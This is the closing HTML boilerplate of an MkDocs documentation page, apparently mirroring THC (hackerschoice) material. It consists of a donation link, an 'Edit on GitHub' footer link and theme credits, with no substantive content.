<p><a href="https://www.buymeacoffee.com/hackerschoice"><img alt="&quot;Buy Me A Coffee&quot;" src="https://www.buymeacoffee.com/assets/img/custom_images/yellow_img.png" /></a></p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/THC/README.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>         The quieter you become, the more you are able to hear </p>
</footer>

</body>
</html>